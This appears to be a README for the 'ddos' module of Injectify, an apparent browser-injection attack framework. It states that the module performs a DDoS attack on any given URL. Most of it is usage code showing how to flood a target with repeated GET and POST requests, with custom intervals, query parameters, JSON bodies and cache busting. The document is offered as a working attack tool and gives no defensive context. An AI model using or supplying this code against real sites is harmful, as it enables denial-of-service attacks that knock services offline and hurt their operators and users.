## `ddos` module

Performs a DDOS attack on any given URL.
- Can perform GET & POST requests with custom parameters
- Custom `Content-type` headers (limited to only the current domain)
- Cache busting

## Usage

```js
/**
 * Basic DDoS attack
 */
injectify.module('ddos', 'http://example.com/')
// true


/**
 * Custom interval in milliseconds and without the cache buster
 */
injectify.module('ddos', {
    url: 'http://example.com/',
    interval: 10,
    random: false
})
// true


/**
 * Custom set of URL query parameters
 */
injectify.module('ddos', {
    method: 'GET',
    url: 'http://example.com/',
    params: 'param1=true&param2=false'
})
// true


/**
 * Different methods of passing the query parameters
 */
injectify.module('ddos', {
    method: 'POST',
    url: 'http://example.com/?param1=true&param2=true',
    params: {
        param3: true,
        param4: false,
    }
})
// true


/**
 * Send POST requests with a JSON body
 */
injectify.module('ddos', {
    method: 'POST',
    url: 'http://example.com/',
    type: 'application/json',
    body: {
        object: {
            value1: true,
            value2: false
        }
    },
})
// true
```